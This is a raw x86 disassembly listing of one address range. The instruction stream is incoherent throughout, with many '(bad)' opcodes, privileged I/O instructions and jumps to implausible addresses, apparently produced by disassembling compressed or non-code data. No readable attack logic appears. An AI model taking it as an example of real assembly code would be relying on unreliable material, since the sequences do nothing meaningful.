  422523:	idiv   DWORD PTR [edi]
  422525:	jl     0x422546
  422527:	sahf   
  422528:	xchg   edx,eax
  422529:	popf   
  42252a:	xchg   ebx,edx
  42252c:	icebp  
  42252d:	ds push edx
  42252f:	xchg   ebp,eax
  422530:	jnp    0x422544
  422532:	sub    al,0x74
  422534:	xor    DWORD PTR [esi+ecx*4+0x9f26db8],eax
  42253b:	loope  0x42251d
  42253d:	jo     0x4224f4
  42253f:	rcr    ecx,0x61
  422542:	and    ebx,ecx
  422544:	nop
  422545:	mov    DWORD PTR [ebx+0x49559c04],ebp
  42254b:	jne    0x42258c
  42254d:	xlat   BYTE PTR ds:[ebx]
  42254e:	sub    DWORD PTR [ebx],edi
  422550:	mov    dh,0x3
  422552:	add    DWORD PTR [eax+0x10b45452],0x39f0c59c
  42255c:	mov    cl,0xa2
  42255e:	dec    edi
  42255f:	sub    DWORD PTR [esi+edi*2],ebp
  422562:	dec    edx
  422563:	lock and BYTE PTR [ebx+0x64],dl
  422567:	shl    BYTE PTR [esi+ebx*2],cl
  42256a:	sti    
  42256b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42256c:	(bad)  
  42256d:	(bad)  
  42256e:	outs   dx,BYTE PTR ds:[esi]
  42256f:	stos   DWORD PTR es:[edi],eax
  422570:	lods   al,BYTE PTR ds:[esi]
  422571:	gs in  eax,0xf
  422574:	mov    dl,dl
  422576:	xchg   ebp,eax
  422577:	call   0xd19093f5
  42257c:	fstp   TBYTE PTR [edi-0xab0f299]
  422582:	xchg   ebp,eax
  422583:	add    edi,edi
  422585:	loope  0x4225d0
  422587:	pop    ds
  422588:	mov    eax,0x4227d55d
  42258d:	push   0xffffffdc
  42258f:	sub    dl,BYTE PTR [ebx-0x7039e99e]
  422595:	dec    eax
  422596:	ss cwde 
  422598:	ins    BYTE PTR es:[edi],dx
  422599:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42259a:	mov    ebp,0x8775dc58
  42259f:	cld    
  4225a0:	sub    BYTE PTR [ecx+ecx*2-0x1d02c1a4],ah
  4225a7:	pusha  
  4225a8:	cwde   
  4225a9:	pop    ds
  4225aa:	sbb    bh,cl
  4225ac:	pusha  
  4225ad:	lods   al,BYTE PTR ds:[esi]
  4225ae:	nop
  4225af:	xor    DWORD PTR [ebx+0x14],esp
  4225b2:	ret    0x54c1
  4225b5:	(bad)  
  4225b6:	xor    esi,DWORD PTR [eax+0x5]
  4225b9:	ja     0x42260f
  4225bb:	inc    ecx
  4225bc:	lds    ecx,FWORD PTR [ebp+edx*4+0x6dc48fb2]
  4225c3:	pop    ebx
  4225c4:	mov    ah,0x1c
  4225c6:	sub    eax,0x2c8d2b15
  4225cb:	lahf   
  4225cc:	push   eax
  4225cd:	push   ecx
  4225ce:	jb     0x42259e
  4225d0:	adc    ah,BYTE PTR [edi+0x49]
  4225d3:	xchg   BYTE PTR [edi+esi*2-0x4220272b],ch
  4225da:	scas   eax,DWORD PTR es:[edi]
  4225db:	mov    eax,ds:0xf2f4793c
  4225e0:	add    BYTE PTR [ecx+0xb],bl
  4225e3:	test   BYTE PTR [ecx-0x2e3c99bb],ch
  4225e9:	xchg   ebx,eax
  4225ea:	mov    ebp,0x94f00cfc
  4225ef:	retf   
  4225f0:	loope  0x42260a
  4225f2:	push   eax
  4225f3:	sbb    al,0x7e
  4225f5:	fld    DWORD PTR [eax-0x7fb94ec]
  4225fb:	xchg   ebp,eax
  4225fc:	cmp    al,0x1c
  4225fe:	mov    ?,WORD PTR [ecx+0x3f9868c9]
  422604:	aad    0x7b
  422606:	imul   esi,DWORD PTR [edx-0x60ef90ca],0xffffff90
  42260d:	rcl    ebp,1
  42260f:	imul   DWORD PTR fs:[esi]
  422612:	add    al,0x50
  422614:	psrad  mm2,mm4
  422617:	stc    
  422618:	clc    
  422619:	inc    ebx
  42261a:	push   0x72
  42261c:	push   0xfffffff9
  42261e:	scas   al,BYTE PTR es:[edi]
  42261f:	(bad)  
  422620:	nop
  422621:	mov    esi,0xdc58dab6
  422626:	mov    cl,0x75
  422628:	(bad)
  42262d:	push   0xd027b81f
  422632:	inc    ebx
  422633:	mov    al,dh
  422635:	out    dx,al
  422636:	add    esp,DWORD PTR [edi-0x14]
  422639:	pop    es
  42263a:	xor    al,0xe4
  42263c:	sub    ebp,0xffffff87
  42263f:	ret    
  422640:	mov    WORD PTR [ebx+0x406ae7d4],?
  422646:	lds    edi,FWORD PTR [ecx]
  422648:	inc    edx
  422649:	or     cl,dh
  42264b:	mov    DWORD PTR [esi+0x7c78ab66],eax
  422651:	pop    edi
  422652:	jg     0x422691
  422654:	cld    
  422655:	ret    
  422656:	jne    0x422627
  422658:	dec    ecx
  422659:	fist   DWORD PTR [esi-0x7c1b118d]
  42265f:	cld    
  422660:	fdivr  DWORD PTR [esi+0x7d284c7c]
  422666:	es cld 
  422668:	fstp   TBYTE PTR [ebx-0x68]
  42266b:	mov    al,0x41
  42266d:	(bad)  
  42266e:	rcl    DWORD PTR [ebp+0x1a],cl
  422671:	push   eax
  422672:	mov    al,0x1b
  422674:	mov    al,ds:0x931594e
  422679:	in     al,dx
  42267a:	sbb    DWORD PTR [ebx-0x14],edi
  42267d:	je     0x42261e
  42267f:	mov    DWORD PTR [ecx-0x9],esi
  422682:	jb     0x42261a
  422684:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422685:	imul   eax,DWORD PTR [edx-0x14647722],0x78
  42268c:	hlt    
  42268d:	data16 mov bl,0xc4
  422690:	mov    bl,0x32
  422692:	out    dx,al
  422693:	fnsave [edx+0x2c]
  422696:	add    al,0x0
  422698:	out    dx,al
  422699:	sbb    cl,BYTE PTR [ecx]
  42269b:	lods   eax,DWORD PTR ds:[esi]
  42269c:	xor    cl,BYTE PTR [ebp+0x61]
  42269f:	(bad)  
  4226a0:	push   edx
  4226a1:	adc    DWORD PTR [esi-0x5c6ab57a],edi
  4226a7:	icebp  
  4226a8:	mov    bl,0xda
  4226aa:	push   ds
  4226ab:	inc    ebp
  4226ac:	xchg   esp,eax
  4226ad:	jmp    0x42263b
  4226af:	xor    eax,0x3d3fb974
  4226b4:	cmp    al,0xfc
  4226b6:	sbb    BYTE PTR [ebx+0x64],bl
  4226b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4226ba:	cmp    BYTE PTR [eax],0x13
  4226bd:	cmp    eax,DWORD PTR [ecx]
  4226bf:	jmp    0x410efa12
  4226c4:	inc    ebp
  4226c5:	mov    edi,0x297a0fc1
  4226ca:	cwde   
  4226cb:	jo     0x422664
  4226cd:	mov    dl,0x83
  4226cf:	pushf  
  4226d0:	mov    al,0xb7
  4226d2:	adc    al,BYTE PTR [edi+edx*4+0x27]
  4226d6:	dec    ecx
  4226d7:	add    eax,0xffffffbd
  4226da:	dec    ebx
  4226db:	or     eax,0xe32f7273
  4226e0:	mov    BYTE PTR [ecx],0x76
  4226e3:	ror    BYTE PTR [ebp+0x1ce72c03],1
  4226e9:	fldcw  WORD PTR [ebx-0x22]
  4226ec:	xor    edx,DWORD PTR [eax-0x3a0e5ba5]
  4226f2:	data16 inc BYTE PTR [edi]
  4226f5:	std    
  4226f6:	popf   
  4226f7:	dec    eax
  4226f8:	mov    ecx,0x712208f2
  4226fd:	xchg   esi,eax
  4226fe:	je     0x422737
  422700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422701:	fcom   st(5)
  422703:	mov    dh,0x57
  422705:	stos   BYTE PTR es:[edi],al
  422706:	test   eax,0xb5d6c359
  42270b:	push   ecx
  42270c:	or     al,0x2b
  42270e:	fwait
  42270f:	popa   
  422710:	rcl    DWORD PTR [ebp+0x37],0x2
  422714:	xchg   edx,eax
  422715:	inc    ecx
  422716:	jmp    0xa5dd:0xa6da0b0c
  42271d:	hlt    
  42271e:	cmp    eax,0x8585bf9e
  422723:	lods   al,BYTE PTR ds:[esi]
  422724:	(bad)  
  422725:	push   es
  422726:	js     0x42277a
  422728:	pop    eax
  422729:	adc    ecx,DWORD PTR [esp+ebx*4+0x6e]
  42272d:	mov    ch,0x77
  42272f:	jl     0x422773
  422731:	and    al,0xaf
  422733:	push   ebx
  422734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422735:	test   al,0x5c
  422737:	xlat   BYTE PTR ds:[ebx]
  422738:	enter  0xbce8,0xef
  42273c:	push   ds
  42273d:	jp     0x422786
  42273f:	jmp    0x422714
  422741:	rol    DWORD PTR [ecx],1
  422743:	fstp   QWORD PTR [ebx+ebp*8]
  422746:	clc    
  422747:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422748:	mov    bh,0xa6
  42274a:	aaa    
  42274b:	inc    ecx
  42274c:	leave  
  42274d:	mov    edx,0x8f2a860c
  422752:	lods   al,BYTE PTR ds:[esi]
  422753:	stc    
  422754:	xchg   esp,eax
  422755:	inc    edx
  422756:	lock or BYTE PTR [eax],dl
  422759:	jmp    0x402b:0xc144d50
  422760:	jmp    0xf33182c1
  422765:	icebp  
  422766:	ret    0xc60d
  422769:	es mov ebx,0xc5890589
  42276f:	aad    0x83
  422771:	cmc    
  422772:	addr16 pop edi
  422774:	dec    edi
  422775:	and    eax,0xf845ddf1
  42277a:	and    dl,al
  42277c:	inc    ebp
  42277d:	sub    edi,DWORD PTR [esi+0x7f3c6713]
  422783:	mov    ?,WORD PTR [ebp+0x63]
  422786:	mov    ds:0x93632c47,eax
  42278b:	out    dx,eax
  42278c:	add    edi,esp
  42278e:	dec    esi
  42278f:	jae    0x422760
  422791:	or     DWORD PTR [esi],edi
  422793:	les    edi,FWORD PTR [edi]
  422795:	and    BYTE PTR [esi+0x2c7ba540],ch
  42279b:	sub    dl,BYTE PTR [edx+ebx*4-0xe]
  42279f:	(bad)  
  4227a0:	cwde   
  4227a1:	loopne 0x4227b8
  4227a3:	pop    esp
  4227a4:	inc    ecx
  4227a5:	loop   0x42279c
  4227a7:	cmp    BYTE PTR [esi+0x1d64b666],0x26
  4227ae:	inc    ebp
  4227af:	sub    DWORD PTR [ebp+0x59a38178],eax
  4227b5:	jge    0x4227cd
  4227b7:	ficomp WORD PTR [ebx+0x20]
  4227ba:	and    edx,DWORD PTR [ecx+0x1627523b]
  4227c0:	gs inc ebp
  4227c2:	ja     0x4227f2
  4227c4:	aad    0x93
  4227c6:	adc    ebx,DWORD PTR ds:0xfb1b0587
  4227cc:	xchg   ebx,eax
  4227cd:	mov    cl,0xb5
  4227cf:	test   DWORD PTR fs:[edi-0x2c],edx
  4227d3:	clc    
  4227d4:	xor    bh,BYTE PTR [edx+eiz*8+0x39]
  4227d8:	popa   
  4227d9:	sahf   
  4227da:	jae    0x42284e
  4227dc:	push   esp
  4227dd:	or     DWORD PTR [eax-0x54],0x5f155fa6
  4227e4:	cmp    edi,esi
  4227e6:	lods   eax,DWORD PTR ds:[esi]
  4227e7:	sbb    eax,0xde67d1b6
  4227ec:	arpl   WORD PTR [esi+0x4cd96945],si
  4227f2:	not    DWORD PTR [ecx+0x18]
  4227f5:	sub    al,BYTE PTR [edi-0x586c6a4f]
  4227fb:	test   eax,0x5496c0aa
  422800:	push   ebx
  422801:	fs inc edi
  422803:	lods   eax,DWORD PTR ds:[esi]
  422804:	cs pop edi
  422806:	push   bx
  422808:	cmp    al,BYTE PTR [ebp-0x5dae1d05]
  42280e:	std    
  42280f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422810:	mov    ecx,0x2c0bc6df
  422815:	and    bl,BYTE PTR [edi]
  422817:	inc    ecx
  422818:	mov    al,ds:0xe42abdcb
  42281d:	pop    ecx
  42281e:	out    0xed,eax
  422820:	push   0x78
  422822:	int    0x85
  422824:	sahf   
  422825:	fst    DWORD PTR ss:[eax-0x6e0ba2e4]
  42282c:	pshufw mm7,QWORD PTR [esp+eax*8+0x12],0x4f
  422832:	sub    bl,cl
  422834:	xchg   ebx,eax
  422835:	popf   
  422836:	pop    edx
  422837:	mov    BYTE PTR [ebp+0x6d],cl
  42283a:	arpl   WORD PTR [ebx+ecx*4-0x68],dx
  42283e:	test   DWORD PTR [edx],edx
  422840:	push   ecx
  422841:	out    dx,eax
  422842:	mov    ebx,DWORD PTR [ebx+0x7c]
  422845:	ret    0xd3a7
  422848:	shl    ch,0x46
  42284b:	sbb    cl,cl
  42284d:	sbb    bh,BYTE PTR [ecx]
  42284f:	shl    DWORD PTR [ebp-0x5bc88b49],cl
  422855:	pop    ebp
  422856:	in     eax,0x42
  422858:	jo     0x422852
  42285a:	sbb    ah,0x20
  42285d:	sbb    bl,BYTE PTR [esi+0x58]
  422860:	sar    ch,cl
  422862:	outs   dx,BYTE PTR ds:[esi]
  422863:	test   DWORD PTR [ebp+0x10d6ca9d],esp
  422869:	je     0x4228be
  42286b:	jle    0x4227fa
  42286d:	jecxz  0x4228c1
  42286f:	js     0x4228be
  422871:	aaa    
  422872:	jecxz  0x42285c
  422874:	add    al,0xbd
  422876:	mov    ah,BYTE PTR [edx+0x38000098]
  42287c:	lea    esp,[eax-0x60]
  42287f:	(bad)  
  422880:	popa   
  422881:	add    ecx,DWORD PTR [esp+eax*4]
  422884:	adc    DWORD PTR [ebx+0x50b65371],0xffffffb5
  42288b:	(bad)  
  42288c:	ffreep st(4)
  42288e:	arpl   cx,di
  422890:	jo     0x4228a2
  422892:	push   ecx
  422893:	xor    al,0xa5
  422895:	add    ecx,DWORD PTR [ebx+0x5d89e1ca]
  42289b:	fucomi st,st(6)
  42289d:	mov    cl,BYTE PTR [ecx]
  42289f:	loopne 0x4228f4
  4228a1:	pop    edi
  4228a2:	es jne 0x4228fa
  4228a5:	les    eax,FWORD PTR [esi+0x1f]
  4228a8:	test   DWORD PTR [eax-0x19],esp
  4228ab:	mov    eax,0xcf1cac99
  4228b0:	outs   dx,BYTE PTR ds:[esi]
  4228b1:	push   edx
  4228b2:	push   ebp
  4228b3:	pop    ebx
  4228b4:	ins    DWORD PTR es:[edi],dx
  4228b5:	jns    0x42286d
  4228b7:	cmp    ah,BYTE PTR [edx]
  4228b9:	in     al,dx
  4228ba:	test   dh,dl
  4228bc:	outs   dx,DWORD PTR ds:[esi]
  4228bd:	inc    edi
  4228be:	(bad)  
  4228c0:	push   0x8ddb58df
  4228c5:	push   ds
  4228c6:	in     eax,dx
  4228c7:	mov    al,0x25
  4228c9:	lock mov esp,0xeb3389fe
  4228cf:	cdq    
  4228d0:	fsub   QWORD PTR [esi]
  4228d2:	mov    al,0xc3
  4228d4:	div    BYTE PTR ds:[bp+di]
  4228d8:	imul   edi,DWORD PTR [esi],0xffffffa5
  4228db:	in     eax,0xab
  4228dd:	ins    BYTE PTR es:[edi],dx
  4228de:	inc    ecx
  4228df:	(bad)  
  4228e0:	ja     0x422900
  4228e2:	sub    eax,0x37c4676
  4228e7:	retf   0xc3a9
  4228ea:	lea    edx,[eax-0x55]
  4228ed:	outs   dx,BYTE PTR ds:[esi]
  4228ee:	dec    ebx
  4228ef:	mov    edx,0xa6d32a65
  4228f4:	mov    edx,0x38afc8aa
  4228f9:	inc    eax
  4228fa:	pop    ss
  4228fb:	call   0xa079fe4b
  422900:	pushf  
  422901:	clc    
  422902:	cmc    
  422903:	call   0x5858:0xbb88381
  42290a:	adc    ch,ch
  42290c:	jae    0x422951
  42290e:	fcom   st(7)
  422910:	aam    0x5
  422912:	pop    eax
  422913:	push   edx
  422914:	pop    esi
  422915:	xchg   esp,eax
  422916:	or     DWORD PTR [eax+0x6e],edx
  422919:	out    dx,eax
  42291a:	nop
  42291b:	xor    edi,DWORD PTR [edx-0xe]
  42291e:	and    eax,0xfe6536b2
  422923:	aaa    
  422924:	pop    ds
  422925:	rcl    BYTE PTR [eax*4-0x458d48b2],0xa7
  42292d:	jl     0x5aa61d12
  422933:	and    eax,esi
  422935:	cmp    dh,BYTE PTR [ecx+0xf]
  422938:	sbb    eax,0x75b455dd
  42293d:	and    DWORD PTR ds:0x92ebf8f7,ebp
  422943:	sub    bl,BYTE PTR [ecx+0x28]
  422946:	xchg   edi,eax
  422947:	pop    ebp
  422948:	adc    DWORD PTR [eax],edi
  42294a:	dec    edx
  42294b:	xor    eax,0x5e08181b
  422950:	pop    es
  422951:	jmp    0xd1a79205
  422956:	push   ss
  422957:	ja     0x422926
  422959:	add    BYTE PTR [edx],dl
  42295b:	mov    bh,0x2d
  42295d:	mov    bh,0x91
  42295f:	repz dec ecx
  422961:	jno    0x42291a
  422963:	(bad)  
  422964:	fisubr WORD PTR [ecx]
  422966:	xor    ch,BYTE PTR [eax]
  422968:	int    0xb3
  42296a:	sbb    DWORD PTR [esi],edx
  42296c:	test   eax,0xf23b78e5
  422971:	inc    eax
  422972:	mov    esi,0xaa823605
  422977:	or     BYTE PTR [ebp+0x69b603b0],0x56
  42297e:	jmp    DWORD PTR [eax+0x7c]
  422981:	in     eax,0xd2
  422983:	add    ch,ah
  422985:	or     ebx,DWORD PTR [edx+edi*1+0x3]
  422989:	inc    esi
  42298a:	mov    ds:0x94057381,al
  42298f:	pop    edi
  422990:	and    ecx,esi
  422992:	mov    bl,0x22
  422994:	(bad)  
  422995:	rol    DWORD PTR ds:[ecx-0x50],cl
  422999:	mov    esi,0x27ff6d1e
  42299e:	mov    esp,0x733ee7d
  4229a3:	popa   
  4229a4:	sbb    DWORD PTR [ebp+0x4b6468c2],esi
  4229aa:	and    dh,0xb
  4229ad:	mov    cl,0x10
  4229af:	rcr    eax,cl
  4229b1:	maxps  xmm1,XMMWORD PTR [edx+edi*4-0x79f5a6a0]
  4229b9:	jmp    0xe42e42d2
  4229be:	jl     0x422a28
  4229c0:	or     al,0x47
  4229c2:	xchg   DWORD PTR [ebp+0x0],ebx
  4229c5:	sbb    ecx,ebp
  4229c7:	xchg   edi,eax
  4229c8:	sbb    bl,BYTE PTR [esi+edx*2-0x6465111d]
  4229cf:	jg     0x4229a0
  4229d1:	std    
  4229d2:	sub    bl,dh
  4229d4:	in     eax,0xf6
  4229d6:	imul   ecx,DWORD PTR [eax],0xd02cf284
  4229dc:	and    ebp,DWORD PTR [edi-0x56ba52bd]
  4229e2:	sbb    esp,edx
  4229e4:	mov    edi,0x4298fd93
  4229e9:	retf   0xf7ca
  4229ec:	mov    ch,0x1d
  4229ee:	pop    ds
  4229ef:	pop    es
  4229f0:	xchg   esp,eax
  4229f1:	jmp    0x8a21a3d8
  4229f6:	sbb    dl,BYTE PTR [ecx]
  4229f8:	mov    esi,0x7f2a20b1
  4229fd:	inc    DWORD PTR [ecx+0x4]
  422a00:	inc    eax
  422a01:	cmp    BYTE PTR ds:0x39a4df13,ch
  422a07:	mov    cl,0xbc
  422a09:	rol    BYTE PTR [ebx],cl
  422a0b:	std    
  422a0c:	xor    ebp,esi
  422a0e:	xlat   BYTE PTR fs:[ebx]
  422a10:	cdq    
  422a11:	inc    ecx
  422a12:	xchg   esp,eax
  422a13:	lea    edi,[edx]
  422a15:	jmp    0x8a91:0x8250ef6e
  422a1c:	retf   0x6fc
  422a1f:	sbb    BYTE PTR [ebp-0x41],ah
  422a22:	ret    
  422a23:	xchg   BYTE PTR [edi-0xd58cd0c],ch
  422a29:	ret    
  422a2a:	outs   dx,DWORD PTR cs:[esi]
  422a2c:	aad    0x12
  422a2e:	sub    eax,0xf3226c04
  422a33:	mov    edi,0xea6fad27
  422a38:	and    DWORD PTR [edx],0xffffffef
  422a3b:	das    
  422a3c:	ins    DWORD PTR es:[edi],dx
  422a3d:	jo     0x422a72
  422a3f:	mov    BYTE PTR [edi],ah
  422a41:	mov    edi,ecx
  422a43:	xor    eax,0xbfbfac23
  422a48:	int3   
  422a49:	dec    eax
  422a4a:	sbb    al,0x5b
  422a4c:	test   eax,0x2abb8305
  422a51:	sbb    DWORD PTR [esi+0x72],eax
  422a54:	sub    DWORD PTR [eax],ebp
  422a56:	mov    esi,DWORD PTR [ebp+0x3f9b31e9]
  422a5c:	nop
  422a5d:	pop    esi
  422a5e:	dec    edi
  422a5f:	sar    BYTE PTR [ebx+ebp*8+0x55],0x69
  422a64:	arpl   WORD PTR [edx+0x59],si
  422a67:	jp     0x422ab7
  422a69:	pusha  
  422a6a:	arpl   sp,si
  422a6c:	push   cs
  422a6d:	lea    edi,[edx+0x4c74f8d2]
  422a73:	(bad)  
  422a74:	adc    al,0x74
  422a76:	xor    ebp,eax
  422a78:	in     al,0x8a
  422a7a:	in     al,0xda
  422a7c:	jno    0x422a58
  422a7e:	int3   
  422a7f:	jge    0x422adb
  422a81:	add    esp,DWORD PTR [esi+eiz*2]
  422a84:	lods   eax,DWORD PTR ds:[esi]
  422a85:	xchg   DWORD PTR [edi],esp
  422a87:	jae    0x422ad3
  422a89:	xor    BYTE PTR [ecx-0x6c3b9956],bl
  422a8f:	or     al,BYTE PTR ds:0x80b21d05
  422a95:	(bad)
  422a99:	out    dx,eax
  422a9a:	shl    DWORD PTR [edx-0xf],0x2c
  422a9e:	adc    esi,DWORD PTR [ebp-0x53]
  422aa1:	mov    al,ds:0x57440e07
  422aa6:	aam    0xaf
  422aa8:	cmp    DWORD PTR [edx+ecx*2],0xb2d72df6
  422aaf:	lock mov BYTE PTR [esi+0x492bdb5f],al
  422ab6:	lds    ebp,FWORD PTR [ecx]
  422ab8:	sub    eax,0x72c318ff
  422abd:	stos   BYTE PTR es:[edi],al
  422abe:	or     BYTE PTR [ecx-0x61],ah
  422ac1:	and    cl,dl
  422ac3:	xchg   edx,eax
  422ac4:	sub    al,BYTE PTR [ecx]
  422ac6:	dec    eax
  422ac7:	(bad)  
  422ac8:	icebp  
  422ac9:	mov    ebx,ebx
  422acb:	arpl   WORD PTR [edi],dx
  422acd:	in     eax,0x79
  422acf:	pop    es
  422ad0:	adc    eax,0x7ec028d6
  422ad5:	pop    ebx
  422ad6:	das    
  422ad7:	loope  0x422b19
  422ad9:	lods   eax,DWORD PTR ds:[esi]
  422ada:	(bad)  
  422adb:	cld    
  422adc:	ins    DWORD PTR es:[edi],dx
  422add:	(bad)  
  422ade:	jmp    FWORD PTR [edx]
  422ae0:	popa   
  422ae1:	neg    DWORD PTR [edi-0x7]
  422ae4:	xchg   ebp,eax
  422ae5:	inc    eax
  422ae6:	jmp    0x8569:0x6bdd725d
  422aed:	xor    eax,0x76f95722
  422af2:	lahf   
  422af3:	adc    eax,0x885d0ca5
  422af8:	and    ebx,0xfffffff7
  422afb:	out    dx,eax
  422afc:	and    al,0xde
  422aff:	(bad)  
  422b00:	xlat   BYTE PTR ds:[ebx]
  422b01:	lock jle 0x422b17
  422b04:	sub    DWORD PTR [edi-0x2beeb1c4],eax
  422b0a:	dec    esp
  422b0b:	add    esp,DWORD PTR [ebp-0x2adfa0ac]
  422b11:	xor    bl,dh
  422b13:	add    DWORD PTR [ebp+0x3c],0xa5df017c
  422b1a:	jb     0x422b49
  422b1c:	call   0x2f60efb2
  422b21:	out    0xd6,eax
  422b23:	push   edx
  422b24:	push   eax
  422b25:	jmp    0x422add
  422b27:	(bad)  
  422b28:	pop    ds
  422b29:	jbe    0x422ad4
  422b2b:	lods   al,BYTE PTR ds:[esi]
  422b2c:	push   ebp
  422b2d:	(bad)  
  422b2e:	and    al,0xf9
  422b30:	ins    BYTE PTR es:[edi],dx
  422b31:	lock les esp,FWORD PTR es:[ebp-0x1184e082]
  422b39:	pop    es
  422b3a:	and    bl,ah
  422b3c:	pop    ss
  422b3d:	mov    eax,0x47fa27b2
  422b42:	jp     0x422ba9
  422b44:	in     al,dx
  422b45:	cs mov al,0x24
  422b48:	adc    eax,ebx
  422b4a:	sub    esp,DWORD PTR [esi+0x3117a29b]
  422b50:	fnsave [edi+ecx*8]
  422b53:	xchg   edi,eax
  422b54:	pop    es
  422b55:	repnz sub DWORD PTR [edx],esp
  422b58:	sub    ah,BYTE PTR [ecx-0x45ab9c38]
  422b5e:	jae    0x422b74
  422b60:	sbb    DWORD PTR es:[eax-0x3d],eax
  422b64:	rcr    BYTE PTR [edi-0x3b],cl
  422b67:	in     al,0x1b
  422b69:	inc    edi
  422b6a:	popa   
  422b6b:	rcl    ecx,0xcf
  422b6e:	enter  0x47f,0x62
  422b72:	or     ch,BYTE PTR [ebx-0x49a92395]
  422b78:	push   ds
  422b79:	pop    ds
  422b7a:	aad    0xd2
  422b7c:	sbb    BYTE PTR [ecx],0xf0
  422b7f:	sbb    ebx,edi
  422b81:	adc    dh,cl
  422b83:	cwde   
  422b84:	xor    DWORD PTR [eax+0x38],ebp
  422b87:	dec    ecx
  422b88:	jae    0x422b79
  422b8a:	(bad)  
  422b8b:	jo     0x422b4b
  422b8d:	mov    ch,0x1f
  422b8f:	jp     0x422b7d
  422b91:	push   ebp
  422b92:	jecxz  0x422bd8
  422b94:	imul   esp,DWORD PTR [ebx+0x35],0xf
  422b98:	cld    
  422b99:	adc    al,0x4e
  422b9b:	add    DWORD PTR [edx-0x4a],edx
  422b9e:	pop    ecx
  422b9f:	add    BYTE PTR [esi+ebx*8+0x2302613b],cl
  422ba6:	ins    DWORD PTR es:[edi],dx
  422ba7:	mov    eax,esi
  422ba9:	add    ecx,DWORD PTR [ebp+ebp*4+0x25]
  422bad:	jae    0x422c18
  422baf:	mov    WORD PTR [edi],ss
  422bb1:	imul   esp,ecx,0xffffffed
  422bb4:	push   esp
  422bb5:	repnz xor DWORD PTR [eax-0x4bc2eef0],edx
  422bbc:	mov    dl,0xdf
  422bbe:	or     eax,0x626f68cf
  422bc3:	shr    BYTE PTR ds:0xe5e51f08,0xf1
  422bca:	mov    ebx,edx
  422bcc:	and    ah,BYTE PTR [esi]
  422bce:	jmp    0x422c3b
  422bd0:	imul   esp,DWORD PTR [edi+0x26],0x56
  422bd4:	retf   0xa434
  422bd7:	test   al,0x5d
  422bd9:	mov    edx,esp
  422bdb:	inc    edx
  422bdc:	xlat   BYTE PTR ds:[ebx]
  422bdd:	lods   eax,DWORD PTR ds:[esi]
  422bde:	sub    DWORD PTR [esi+0x55],0xfffffff6
  422be2:	jne    0x422b6b
  422be4:	clc    
  422be5:	pop    esi
  422be6:	mov    ch,0xe0
  422be8:	cmc    
  422be9:	inc    ebp
  422bea:	mov    eax,ds:0x69bec4d1
  422bef:	les    edx,FWORD PTR [ebx]
  422bf1:	mov    cl,0x6f
  422bf3:	dec    edi
  422bf4:	mov    edx,0xe3a8edd5
  422bf9:	int3   
  422bfa:	xor    ebx,0x54eba9f9
  422c00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c01:	lods   eax,DWORD PTR ds:[esi]
  422c02:	addr16 or eax,ebx
  422c05:	(bad)  
  422c06:	mov    ds:0x78e76e8d,eax
  422c0b:	(bad)  
  422c0d:	outs   dx,BYTE PTR ds:[esi]
  422c0e:	pusha  
  422c0f:	cli    
  422c10:	cmovg  eax,DWORD PTR [ebx]
  422c13:	call   0x57b0:0xaca05298
  422c1a:	jae    0x422c46
  422c1c:	pusha  
  422c1d:	cmp    BYTE PTR [esi],0x1a
  422c20:	mov    cl,BYTE PTR [ecx]
  422c22:	popa   
  422c23:	inc    esi
  422c24:	cwde   
  422c25:	adc    dh,BYTE PTR [ecx-0x5ad4e596]
  422c2b:	mov    al,0x55
  422c2d:	pusha  
  422c2e:	lock repz imul esi,DWORD PTR [edx],0x937cb1b9
  422c36:	mov    cl,0x17
  422c38:	push   esi
  422c39:	mov    es,WORD PTR [esi-0x392f1772]
  422c3f:	cmp    bh,ch
  422c41:	lea    ecx,[ecx-0x25225d53]
  422c47:	fistp  DWORD PTR [eax-0x66303d5e]
  422c4d:	fucom  st(2)
  422c4f:	cmp    ecx,esi
  422c51:	or     BYTE PTR [ecx],dh
  422c53:	js     0x422bfa
  422c55:	push   eax
  422c56:	aam    0x31
  422c58:	and    bh,BYTE PTR [ebx+0x5a]
  422c5b:	ret    
  422c5c:	outs   dx,BYTE PTR ds:[esi]
  422c5d:	add    DWORD PTR [ebx],eax
  422c5f:	cmp    ecx,DWORD PTR [ebp+0x30]
  422c62:	adc    ch,cl
  422c64:	dec    esi
  422c65:	inc    eax
  422c66:	cmp    ah,BYTE PTR [edi-0x5d]
  422c69:	push   eax
  422c6a:	test   DWORD PTR [edi+eax*4],ecx
  422c6d:	idiv   DWORD PTR [edi+ebp*4+0x644de4b1]
  422c74:	and    al,0x47
  422c76:	jae    0x422c3a
  422c78:	or     esi,esi
  422c7a:	add    DWORD PTR [edx+0x3cd3ad7f],ebx
  422c80:	or     al,0xb0
  422c82:	sbb    ebx,DWORD PTR ds:0xd5bac4bf
  422c88:	cmc    
  422c89:	fs xchg esi,eax
  422c8b:	jnp    0x422ce0
  422c8d:	aad    0xb2
  422c8f:	mov    bl,0x3
  422c91:	lods   eax,DWORD PTR ds:[esi]
  422c92:	mov    dh,0xd2
  422c94:	stos   BYTE PTR es:[edi],al
  422c95:	jne    0x422c43
  422c97:	(bad)  
  422c98:	mov    ah,0x47
  422c9a:	mov    ds:0xe6fb092b,eax
  422c9f:	mov    DWORD PTR [ecx+0x2c],esi
  422ca2:	inc    ebp
  422ca4:	cmp    edx,DWORD PTR [ebx]
  422ca6:	mov    eax,DWORD PTR [edi+0x2c3b879e]
  422cac:	fadd   DWORD PTR [ecx+0x54]
  422caf:	stc    
  422cb0:	and    DWORD PTR [ebx-0xd],ecx
  422cb3:	pop    edx
  422cb4:	cmp    eax,0x478e64c
  422cb9:	mov    BYTE PTR [edi],bh
  422cbb:	cmp    cl,cl
  422cbd:	pop    ds
  422cbe:	hlt    
  422cbf:	mov    al,ds:0x6ac313f9
  422cc4:	int    0xd0
  422cc6:	push   edx
  422cc7:	xchg   ebp,eax
  422cc8:	pop    ecx
  422cc9:	fsub   QWORD PTR [ecx+0x67]
  422ccc:	cmp    eax,0x301faf7
  422cd1:	push   eax
  422cd2:	cwde   
